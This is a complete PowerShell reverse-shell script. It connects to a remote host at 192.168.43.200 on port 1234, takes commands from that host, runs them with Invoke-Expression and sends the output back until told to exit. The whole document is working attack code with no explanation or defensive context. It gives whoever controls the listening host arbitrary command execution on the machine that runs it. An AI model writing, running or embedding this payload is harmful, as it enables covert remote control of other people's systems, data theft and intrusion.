$TargetIP = "192.168.43.200"  
$port = 1234            
try {
    $client = New-Object System.Net.Sockets.TcpClient($targetIP, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true
    $writer.WriteLine("Connected to PowerShell reverse shell")
    while ($true) {
        $command = $reader.ReadLine()
        if ($command -eq "exit" -or $command -eq $null) {
            break
        }
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
        }
        catch {
            $output = $_.Exception.Message
        }
        $writer.WriteLine($output)
    }
}
catch {
    Write-Error "Connection failed: $($_.Exception.Message)"
}
finally {
    if ($writer) { $writer.Close() }
    if ($reader) { $reader.Close() }
    if ($stream) { $stream.Close() }
    if ($client) { $client.Close() }
}
